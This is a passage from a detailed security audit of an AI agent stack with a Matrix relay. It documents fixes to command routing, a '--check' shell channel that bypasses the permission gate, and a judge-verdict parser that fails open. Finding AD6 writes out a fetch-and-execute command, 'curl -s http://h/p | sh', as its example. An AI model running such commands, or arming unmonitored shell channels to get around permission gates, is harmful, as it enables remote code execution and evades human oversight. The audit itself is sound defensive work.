executes the sweep's verdict on each kind of entry.

---

### AD5 — the command that was in none of the three tables · **LOW** · PROVEN · **FIXED**

`KNOWN_COMMANDS` is what separates a command from prose. It listed every pi
built-in worth refusing and three of the four extension commands this stack
registers. `/agents` was missing, so a Matrix `/agents` classified as `text`,
went to the model as a user turn, and cost a full model call on the one slot for
a message the model cannot act on — while every other unrunnable command gets
"Run it in the terminal."

The probe derives the registered set from the four registration sites rather than
restating it, so the assertion is "no registered command is unknown to the
router" rather than "agents is in the list":

```
   extension commands this stack registers : /agents /loop /prinny /stack
   registered but unknown to the router    : (none)      ← was: /agents
   "/agents"  -> refuse (agents)                          ← was: text
```

---

### AD6 — the one allowed argument that is a shell command · **MEDIUM** · PROVEN · **FIXED**

**What it was.** `MATRIX_ALLOWED.loop` is `null`, meaning every subcommand and
every flag. The header justifies that at length, and the justification is sound
as far as it goes:

> an allowlisted sender can already direct arbitrary work in prose — bash, edits,
> anything — **subject only to the permission gate**.

The last clause is what makes the argument work, and there is exactly one
argument on the allowed surface it is not true of. `--check CMD` is stored in
`LoopState` and run by `runGoalCheck` as:

```js
   pi.exec("bash", ["-lc", wrapCheckCommand(state.checkCommand)], { timeout: … })
```

once per iteration for the life of the run, and it survives `/loop resume` (see
§3.6 — the check command is kept by all four restart paths). `pi.exec` is
`execCommand`; it emits **no `tool_call`**. So:

```
   the same string, two doors:

     "/loop start x --check 'curl -s http://h/p | sh'"   from Matrix
        → LoopState.checkCommand
        → pi.exec("bash", …)                    prinny relay: NEVER SEES IT
                                                rtk-pi gate:  NEVER SEES IT
                                                guard's cap:  NEVER SEES IT

     "run: curl -s http://h/p | sh"             from Matrix, as prose
        → the model calls the `bash` TOOL
        → tool_call                             prinny relay: gate=true
                                                              "bash changes
                                                               the machine"
```

**Honest scoping.** `permissionMode` defaults to `off`, so the relay only means
anything to an operator who turned it on. That operator is precisely the one this
was misleading. And the property is not only about the relay: a `--check` is the
one thing on this surface that runs repeatedly, indefinitely, and leaves no trace
in the transcript beyond a status line.

**The same shape from the model's side, not fixed and not a defect.** The `loop`
tool declares `check` as a parameter, so the model can arm a check too. That is
deliberate — the model is already inside the trust boundary the tool gate
defines, and a goal check is the loop tool's whole point — but it is worth
knowing that a check command is the one shell channel in this stack that no
`tool_call` handler ever sees. Recorded in §11.4.

**The fix.** `--check` joins `REFUSED_FLAGS`, with its own reason. `/loop start
<goal>` from Matrix still works; a check is attached in the terminal, by the
person choosing the command.

---

### AD7 — the second handle on a refused door · **MEDIUM** · PROVEN · **FIXED**

`--model` is refused from Matrix because `/model` is, and "a permitted command
must not become a side door to a refused one". `--rescue-model` is the same door.
`interveneStuck()` calls `switchModel(pi, ctx, state.rescueModel)` on the third
consecutive stuck turn, which is the identical session-model switch — just later,
and conditional on the run getting stuck, which makes it harder to notice rather
than safer.

The `--model` guard could not catch it. The pattern is
`(^|\s)--model(=|\s|$)`, which needs whitespace or a start-of-string before the
flag; in `--rescue-model` the preceding characters are `e-`.

Both are refused now, the refusals are ordered longest-flag-first so each one is
named as itself, and each carries its own reason instead of one sentence that was
wrong for two of the three.

---

## 10. Fixed alongside, and worth naming

**`formatRunningAgents()` filtered on status too.** Same defect as AD2, one
function over, and it is what made the tool's wrong sentence *also* carry a wrong
list. Now `isBusyRecord`, like the other three readers.

**The refusal message was one sentence for three reasons.** Before this pass
`REFUSED_FLAGS` had one member, so "it changes the model for the whole session"
was accurate. With three members it would have been wrong for two of them, and a
refusal that misstates its reason is a refusal the sender will argue with.

---

## 11. Still open, and why — decisions, not omissions

**11.1 The sweep still cannot see a failed Matrix command.** AD4's residue, above.
There is no observable; the claim was fixed instead. If pi ever gives
`sendUserMessage` a return value, this becomes answerable in one line.

**11.2 SIGTERM-from-outside on a goal check.** Unchanged from the eleventh pass:
bash runs its `EXIT` trap when SIGTERMed, so the marker is present and `$?` is
whatever the last command left. The marker is proof of *completion*, not of
*intent*.

**11.3 The watchdog still skips a verifying record**, and `Watchdog.check()`
deletes its state rather than merely skipping it. Harmless and deliberate: the
per-call deadline is minutes where the watchdog is 45 of them, and
`continueSettledAgent` calls `watchdog.start()` again for any later run.

**11.4 A `--check` is a shell channel no `tool_call` handler can see**, from the
loop tool as well as from `/loop`. Closed from Matrix (AD6); left open from the
tool and the terminal, where the caller is already inside the trust boundary. If
that ever needs closing, the place is `runGoalCheck`, not the routing table — an
`emitToolCall`-shaped hook around `pi.exec` would cover `rtk-pi`'s version probe
too.

**11.5 `parseJudgeVerdict` reads `UNADDRESSED` as ADDRESSED.** `readVerdictValue`
tests `/NOT[_\s-]?ADDRESSED/i` and then `/ADDRESSED/i`, neither anchored, so a
judge that wrote `VERDICT: UNADDRESSED` would be read as a pass. Left alone: the
prompt asks for one of two exact tokens, adding a `\b` risks the tolerant forms
the parser was widened to accept (S2, U4), and the fail-open policy already makes
an unreadable verdict a pass. Recorded so the next reader does not have to
re-derive it.

**11.6 Still open by decision from earlier passes**, each with a reason in §10.4
of `…-deliveries.md`: T6, per-session loop state, T1's general case,
`hasStateChange`'s keyword list, the brief-before-session window, and resuming a
completed run.

---

## 12. What shipped

### The seven findings

| # | file | the change | control run |
| --- | --- | --- | --- |
| AD1 | `pi-subagents-lite/src/agents/tool-execution.ts` | `findModelInRegistry(params.model, …)` | `q1` prints the parent's model in the BEFORE column; 2 of 3 tests fail with the read removed |
| AD2 | same file | `isBusyRecord` in the tool's precondition and in the busy list; a sentence that names the run | `q2` reports "already completed" and an unaborted signal; 3 tests fail |
| AD3 | `prinny-channel/src/compaction-request.ts` (new), `extensions/index.ts` | `planCompaction`, `pendingCompaction`, `drainPendingCompaction` at `agent_settled` | `q3` shows `compact() → abort()` in the BEFORE column; 5 + 3 tests fail |
| AD4 | `prinny-channel/extensions/index.ts` | the receipt claims delivery, not success | `q4`; 1 test fails |
| AD5 | `prinny-channel/src/command-routing.ts` | `agents` in `KNOWN_COMMANDS` | `q4` classifies `/agents` as `text`; 1 test fails |
| AD6 | same file | `--check` in `REFUSED_FLAGS`, with its own reason | `q4` classifies the whole line as `run`; 2 tests fail |
| AD7 | same file | `--rescue-model` likewise | `q4`; 2 tests fail |

### The gates

```
   ( cd vendor/pi-loop-mode       && npm test && npm run lint )          # 198
   ( cd vendor/pi-subagents-lite  && npm test && node tests/lint.mjs )   # 283 + 85/85
   ( cd vendor/prinny-channel     && npm test && npm run lint )          # 332
   ( cd .pi/extensions/compaction-guard && npm test )                    #  41
   ( cd vendor/rtk-pi && node --experimental-strip-types --test tests/*.test.ts )  # 20
                                                                          ─────
                                                                           874
```

### The test that had to be rewritten rather than added

`vendor/pi-subagents-lite/tests/tool-surface.test.ts` asserted
`doesNotMatch(/params\.model\b/)`. That assertion was the twelfth pass's premise
written down, and it protected the defect. It is replaced by two assertions and a
control: the tool DOES read `params.model` and `params.thinking`, and the
listener that writes both is pinned in the same suite so the pair cannot drift.

This is the first time in the series that a fix required deleting a prior pass's
regression test rather than adding one. That is worth a sentence of its own: **a
test written to pin a REMOVAL is a test of a premise, and a premise is the thing
most worth re-deriving.** A test that pins an addition can be wrong about why; a
test that pins an absence can only be wrong about whether.

---

## 13. Running the evidence

```sh
cd ~/qwen3.8-forge

# the gates — check the TEST COUNT as well as the failure count
( cd vendor/pi-loop-mode       && npm test && npm run lint )
( cd vendor/pi-subagents-lite  && npm test && node tests/lint.mjs )
( cd vendor/prinny-channel     && npm test && npm run lint )
( cd .pi/extensions/compaction-guard && npm test )
( cd vendor/rtk-pi && node --experimental-strip-types --test tests/*.test.ts )

# just this pass's regression tests
( cd vendor/pi-subagents-lite && node --experimental-strip-types --test \
    tests/tool-surface.test.ts )
( cd vendor/prinny-channel && node --experimental-strip-types --test \
    tests/command-routing.test.ts tests/compaction-request.test.ts )

# this pass's probes
P=context/testing/probes
node                            $P/q1-the-model-override-nobody-applies.mjs
node                            $P/q2-the-stop-the-tool-cannot-reach.mjs
node --experimental-strip-types $P/q3-the-compact-that-aborts-someone-elses-turn.mjs
node --experimental-strip-types $P/q4-what-a-leading-slash-from-matrix-can-do.mjs

# every probe, exit code only
for f in context/testing/probes/[a-z]*.mjs; do
  timeout 240 node --experimental-strip-types "$f" >/dev/null 2>&1 || echo "FAIL $f"
done
```

| probe | what it shows | the control |
| --- | --- | --- |
| `q1` | the real `toolCallListener` + `executeAgentTool` through pi's own jiti: the override resolved, injected, rendered as `▸ Explore (qwen3-4b)`, and the spawn running on the parent's model in the BEFORE column | `params.thinking`, written by the same handler onto the same object one line away, which IS read — if a handler's write could not reach `params`, this one would not either |
| `q2` | the real `AgentManager` and `executeStopAgentTool`: a record in the exact state the settlement chain leaves it in during a verification, stopped from the menu and not stopped from the tool | the `/agents` path, and an ordinary running agent, which must still stop the way it always did |
| `q3` | pi's `compact()` pinned at its first statement; `planCompaction` executed in three states; the shipped loop module pausing on an aborted turn and recording it against the operator | the same run with no abort, which must keep going |
| `q4` | the four registration sites vs `KNOWN_COMMANDS`; `--check` through `parseStartArgs` and `wrapCheckCommand`; the same string through `needsApproval` as a bash tool call; pi's dispatch catch; the sweep's verdict per entry kind | a plain undelivered message, which must still be reported; `/loop start` without flags, which must still be allowed; `--checkout`, which is prose |

---

## 14. The pattern across thirteen audits

```
   inside a module            B1–B8    a function does not do what it says
   between two modules        F1–F11   two correct functions disagree at the seam
   module ↔ pi's runtime      T1–T9    correct code, wrong assumption about the host
   declaration ↔ code         S1–S10   the artefact a reader checks is not what runs
   unit ↔ unit                U1–U9    the rule and the thing it governs are each
                                       right, and are counted in different things
   whole ↔ part               V1–V8    a reader takes a subset that used to be the
                                       whole thing
   fix ↔ its siblings         W1–W6    the rule was established and applied to the
                                       instance in front of it
   host ↔ harness             X1–X5    the evidence models the host, and the model
                              Y1       omits the one thing under test
   call ↔ what the host does  Z1–Z4    the call is correct, the argument is correct,
              with it                  and the value ends up somewhere nobody looked
   the rest of the contract   AA1–AA4  which events reach us at all, and what a host
                                       function's answer is able to say
   the contract IN TIME       AB1–AB4  the answer was available for an instant, and
                                       the reader arrives after it
   sending ↔ receiving        AC1–AC5  something was produced for somebody, and
                                       nobody checked that anybody got it
   instructing ↔ obeying      AD1–AD7  something was decided for a mechanism, and
                                       nobody checked that the mechanism ever saw it
```

Three things transfer out of this one.

**A fix is a new thing in the machine, and the pass that ships it is the last one
that will look at it with fresh eyes.** Five of the seven findings here are the
previous two passes' own fixes: AC5 made `/compact` real and did not ask what
`compact()` does (AD3); AC5 fixed the receipt for one command and left it for the
others (AD4); AC4 added a flag that closed the sweep over the branch that still
needed it (AD4 again); AA4's edit and the twelfth pass's *test* between them
retired the model override (AD1); T5's fix landed at the mechanism and not at its
caller (AD2). None of that is carelessness — every one of those changes is
correct in the thing it was aimed at. What is missing is the second question:
*this fix is now a mechanism; who instructs it, and what does obeying it cost?*

**A test that pins an ABSENCE is a test of a premise.** The series already knows
that a test which cannot execute the code it protects is a test of the diff
(AC1). AD1 is the sharper version: `assert.doesNotMatch(execution,
/params\.model\b/)` cannot be wrong about whether the text is there — it can only
be wrong about why it should not be, and it carries the why nowhere. A pin over
an addition at least names the behaviour it wants; a pin over a removal names
only the removal. **If a test asserts that something is NOT read, it must also
assert what supplies the value instead** — which is what the replacement does.

**Trace an instruction to the code that obeys it, not to the code that resolves
it.** `modelFor()` is correct. `toolCallListener` is correct. The renderer is
correct. The menu is correct. Four correct components, one number, and the number
never reached the spawn. The same shape reads across every finding here: the
allow-list is correct and the gate watches a different channel (AD6); the
manager's stop is correct and the tool returns before it (AD2); the compaction is
correct and it cancels a turn (AD3). **Resolution is not application, and only
one of the two is worth a test.**

---

## 15. Still unwatched

Everything above is fixed against probes and tests, and none of it against a
running model. That has been true for ten passes now, and the list has barely
moved.

1. **§B and §P of `context/testing/subagents-loop-verifier.md`** — one background
   delegation, and the only question is whether the result appears in the
   conversation at all. Still the cheapest run on the list, still the one that
   would have caught AC1, and it is now also the one that would show AD1: with a
   per-type model override configured, §B's transcript names the model the child
   ran on.
2. **§M, §M.2, §M.3** — three `/loop start`s with different `--check`s and
   `/loop status` after each. Five findings across four passes sit there.
3. **§O** — a Matrix message sent while pi is compacting, `/compact` sent FROM
   Matrix, and now a **new case**: `/compact` sent from Matrix *while a loop is
   running*. Before AD3 that pauses the run; after it, the run must finish its
   turn and the compaction must happen after, with the sender told when it
   finishes rather than when it was queued.
4. **A `--check` refusal from Matrix** — one message, and the reply must name
   `--check` and the relay rather than the model.
5. **A real verification**, foreground, `SUBAGENT_VERIFY_ROUNDS=1`, deliberately
   off-task brief — S2, U4, U8, V5, V7/W6, W5, Y1, Z1, T5, AB4, and now AD2:
   `StopAgent` on the record while the judge is running must stop the check.
6. **Log the judge's raw reply.** Still #1 by age — ten passes now — and
   load-bearing for S2, U4, V5 and W5.
7. **A child that compacts** (§L), **a delegation with a loop running** (§I),
   **§J**, **§K/§K.2**, **§N** — none ever run.
8. **The remaining text-pinned fixes.** §15 of `…-deliveries.md` listed them:
   V7/W6 (`j7`, `k6` — an ORDER, the legitimate case), AA3 and AA4 (`n3`, `n4`),
   AB2's routing half (`o2`), AB4's enumeration (`o4`). AA4's is the one that
   failed, twice now: it lost the delivery (AC1) and it lost the model override
   (AD1). Both were found by an execution, and `q1`/`p1` are the two examples of
   what one looks like.

---

## 16. Where to look

- `context/testing/probes/q1`–`q4` — the reproductions. `q1` and `q2` drive real
  pi-importing modules through pi's own bundled jiti; `q3` drives the shipped
  loop module and pins pi's `compact()`; `q4` is half a source pin over pi's
  `dist/` and half the real rules.
- The regression tests:
  `vendor/pi-subagents-lite/tests/tool-surface.test.ts` (AD1, AD2),
  `vendor/prinny-channel/tests/command-routing.test.ts` (AD5, AD6, AD7),
  `vendor/prinny-channel/tests/compaction-request.test.ts` (AD3, AD4).
- **§1** of this document — the machine, with every instruction marked; **§2** —
  the control ledger, which is the artefact this pass exists to leave behind;
  **§3.3** — the goal check, which is where the one unwatched shell channel is.
- `context/design/subagents-loop-verifier-deliveries.md` — the twelfth pass
  (AC1–AC5) and its §8 delivery ledger, which this document's §2 is the mirror
  of. Read that one first if you are new to the stack.
- `…-signals.md` (eleventh, AB1–AB4) · `…-hosts.md` (tenth, AA1–AA4, and the
  host-call ledger) · `…-answers.md` (ninth, Z1–Z4) · `…-turns.md` (eighth,
  X1–X5, Y1) · `…-readers.md` (seventh, W1–W6) · `…-shapes.md` (sixth, V1–V8) ·
  `…-units.md` (fifth, U1–U9, whose §9 reference sections no later document
  restates) · `…-surfaces.md` (fourth, S1–S10) · `…-mechanics.md` (third, T1–T9,
  still the best account of pi's own agent loop) · `…-evaluation.md` (second,
  F1–F11) · `…-anatomy.md` (first, and the design rationale).
- pi's own source, for this pass:
  `node_modules/@earendil-works/pi-agent-core/dist/agent-loop.js:393-452`
  (`prepareToolCall` — `validatedArgs` built, passed to `beforeToolCall`, then
  passed to `tool.execute`; this is AD1's whole mechanism),
  `dist/core/agent-session.js:1367` (`compact()` and its `await this.abort()` —
  AD3), `:924-947` (`_tryExecuteExtensionCommand`, and the catch that returns
  `true` — AD4), `:800`/`:808` (the order: an extension command is dispatched
  ABOVE the compaction throw), `:1107-1135` (`sendUserMessage`, and
  `expandPromptTemplates ?? false`), `dist/core/exec.js` (`execCommand`, which
  emits no `tool_call` — AD6), `dist/core/extensions/runner.js:701`
  (`emitToolCall`).
